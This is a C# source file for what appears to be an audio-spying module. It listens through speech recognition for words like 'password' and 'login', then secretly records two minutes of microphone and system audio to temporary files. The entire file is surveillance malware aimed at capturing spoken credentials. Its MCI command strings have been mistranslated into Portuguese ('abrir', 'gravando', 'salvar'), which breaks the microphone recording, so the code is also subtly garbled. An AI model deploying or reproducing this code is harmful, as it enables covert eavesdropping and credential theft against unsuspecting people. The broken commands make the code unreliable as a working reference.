using System;
using NAudio.Wave;
using System.Threading;
using System.Runtime.InteropServices;
using System.Text;
using System.Speech.Recognition;

namespace SKGBr
{
    class Audio
    {
        static bool recording = false;

        public static void ListenForPasswords(Choices ch = null)
        {
            SpeechRecognitionEngine recognizer = new SpeechRecognitionEngine();
            GrammarBuilder gb = new GrammarBuilder();
            if (ch == null)
            {
                string[] defaults = { "username", "password", "credential", "login", "logon" };
                ch = new Choices(defaults);
            }
            gb.Append(ch);
            Grammar dictationGrammar = new Grammar(gb);
            recognizer.LoadGrammar(dictationGrammar);
            recognizer.SetInputToDefaultAudioDevice();
            while (true)
            {
                RecognitionResult result = recognizer.Recognize();
                if (result != null && !recording)
                {
                    string fname = Helpers.CreateTempFileName(".wav");
                    Console.WriteLine("{0}: Ouviu uma frase interessante {1}, assistindo a uma gravação de dois minutos.",
                                      Helpers.CurrentTime(),
                                      result.Text);
                    recording = true;
                    RecordAudio(120000);// begin recording for two minutes.
                    recording = false;
                }
                else if (recording)
                {
                    Thread.Sleep(5000);
                }
            }
            recognizer.UnloadAllGrammars();
        }
        
        public static void RecordSystemAudio(string outFile, int msToRecord = 10000)
        {
            // Redefine the capturer instance with a new instance of the LoopbackCapture class
            WasapiLoopbackCapture CaptureInstance = new WasapiLoopbackCapture();

            // Redefine the audio writer instance with the given configuration
            WaveFileWriter RecordedAudioWriter = new WaveFileWriter(outFile, CaptureInstance.WaveFormat);

            // When the capturer receives audio, start writing the buffer into the mentioned file
            CaptureInstance.DataAvailable += (s, a) =>
            {
                // Write buffer into the file of the writer instance
                RecordedAudioWriter.Write(a.Buffer, 0, a.BytesRecorded);
            };

            // When the Capturer Stops, dispose instances of the capturer and writer
            CaptureInstance.RecordingStopped += (s, a) =>
            {
                RecordedAudioWriter.Dispose();
                RecordedAudioWriter = null;
                CaptureInstance.Dispose();
            };
            
            // Start audio recording !
            CaptureInstance.StartRecording();
            Thread.Sleep(msToRecord);
            CaptureInstance.StopRecording();
        }

        [DllImport("winmm.dll")]
        static extern Int32 mciSendString(string command, StringBuilder buffer, int bufferSize, IntPtr hwndCallback);

        public static void RecordMicrophone(string outFile, int msToRecord = 10000)
        {
            string guid = Guid.NewGuid().ToString();
            // https://social.msdn.microsoft.com/Forums/vstudio/en-US/3f771824-56b8-4ebf-b941-7afe40a52895/record-audio?forum=vbgeneral
            StringBuilder buf = new StringBuilder();
            mciSendString("abrir novo Tipo waveaudio Alias " + guid, buf, 0, IntPtr.Zero);
            mciSendString("definir " + guid + " formato de tempo ms bitspersample 16 canais 2 samplespersec 44100 bytespersec 192000 alinhamento 4", null, 0, IntPtr.Zero);
            mciSendString("gravando " + guid, buf, 0, IntPtr.Zero);
            Thread.Sleep(msToRecord);
            mciSendString("parar " + guid, buf, 0, IntPtr.Zero);
            mciSendString("salvar " + guid + " " + outFile, buf, 0, IntPtr.Zero);
            mciSendString("fechar " + guid, buf, 0, IntPtr.Zero);
        }

        public static void RecordAudio(int msToRecord=10000)
        {
            string sysAudioFile = Helpers.CreateTempFileName(".wav");
            string micAudioFile = Helpers.CreateTempFileName(".wav");
            Thread sysThread = new Thread(() => Audio.RecordSystemAudio(sysAudioFile, msToRecord));
            Thread micThread = new Thread(() => Audio.RecordMicrophone(micAudioFile, msToRecord));
            sysThread.Start();
            micThread.Start();
            Console.WriteLine("{0}: Gravação de áudio iniciada. Aguardando até que {1} segundos tenham decorrido.",
                              Helpers.CurrentTime(), msToRecord/1000);
            micThread.Join();
            Console.WriteLine("{0}: Gravações de áudio concluídas.", Helpers.CurrentTime());
            Console.WriteLine("\tArquivo de Gravação de Sons do Sistema:\n\t\t{0}", sysAudioFile);
            Console.WriteLine("\tArquivo de Gravação de Microfone:\n\t\t{0}", micAudioFile);

        }
    }
}
